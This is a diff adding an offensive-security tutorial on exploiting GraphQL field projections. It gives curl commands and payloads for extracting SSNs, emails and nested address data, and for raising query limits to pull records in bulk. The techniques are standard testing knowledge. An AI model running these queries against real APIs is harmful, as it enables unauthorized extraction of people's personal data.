@@ -1,0 +1,114 @@
+---
+title: Extract Data Using Projections in GraphQL
+description: Learn to exploit GraphQL projections for data extraction using injection
+  techniques. Understand selective, nested field extraction and query options injection.
+keywords:
+- GraphQL
+- data extraction
+- field projections
+- nested fields
+- query injection
+- sensitive data
+- bulk extraction
+---
+
+# Extract Data Using Projections
+
+## Context
+
+The objective of this article is to demonstrate how to exploit GraphQL field projections to extract sensitive or extensive data via injection. It is assumed that the reader has a working knowledge of the GraphQL schema structure and introspection, crafting and sending GraphQL queries, HTTP request manipulation, and basic data extraction techniques via GraphQL injection. Additionally, familiarity with GraphQL edges/nodes extraction techniques is expected.
+
+## Theory
+
+### Field Projections in GraphQL
+
+A field projection in GraphQL specifies which fields are included in the query response. When projections are exposed without strict controls, an attacker can abuse them to extract unauthorized or sensitive fields.
+
+A common vulnerability model is the lack of field-level access control. With insufficient restrictions, attackers can craft queries that include requests for sensitive fields like social security numbers or passwords.
+
+### Selective and Nested Field Extraction
+
+Selective extraction involves crafting queries that request only specific fields, such as email or social security numbers, directly from the objects available in the GraphQL schema. Nested projection goes a step further, allowing an attacker to query deeply nested objects and fields all in a single request.
+
+To execute an attack, an attacker might first identify sensitive fields using schema introspection or by analyzing error messages. They would then create queries to extract these fields using projections.
+
+### Query Options Injection
+
+Query options injection involves manipulating query arguments such as filters and limits to maximize the amount of data returned. By combining projection techniques with query options, attackers can remove limits and bypass filters, enabling the extraction of large volumes of data.
+
+## Practice
+
+### Manual Extraction Using Field Projections
+
+This technique involves crafting and sending GraphQL queries that directly specify sensitive fields for extraction.
+
+- **Payload (Projection Query):**
+
+    ```graphql
+    { users { id name email ssn } }
+    ```
+
+    Here, the query is constructed to request sensitive fields such as "ssn" from the users object.
+
+- **Execution (Command Line):**
+
+    ```bash
+    curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{ users { id name email ssn } }"}'
+    ```
+
+    Use the above command to send the crafted query to the target GraphQL endpoint, resulting in the extraction of desired fields.
+
+**Outcome:**
+Sensitive fields, including social security numbers, are returned in the query response.
+
+### Nested Field Extraction
+
+This technique expands on basic projections by requesting deeply nested data, which can reveal detailed information about entities.
+
+- **Payload:**
+
+    ```graphql
+    { users { id profile { address { street city zip } phone } } }
+    ```
+
+    The query is crafted to extract nested objects like address and phone details.
+
+- **Execution (Command Line):**
+
+    ```bash
+    curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{ users { id profile { address { street city zip } phone } } }"}'
+    ```
+
+    Send this request to retrieve comprehensive nested data from the GraphQL API.
+
+**Outcome:**
+Detailed information on users, including nested address and contact details, is returned in the response.
+
+### Bulk Extraction via Query Options Injection
+
+By injecting query options, such as limits, attackers can manipulate the query to extract more data from the server than intended.
+
+- **Payload:**
+
+    ```graphql
+    { users(limit:1000) { id name email ssn } }
+    ```
+
+    Here, the query is designed to maximize data retrieval by increasing the limit option.
+
+- **Execution (Command Line):**
+
+    ```bash
+    curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query":"{ users(limit:1000) { id name email ssn } }"}'
+    ```
+
+    Execute this command to perform bulk extraction of user data via manipulated GraphQL queries.
+
+**Outcome:**
+A significant amount of sensitive data, potentially including thousands of records, is extracted in one query.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **Postman**
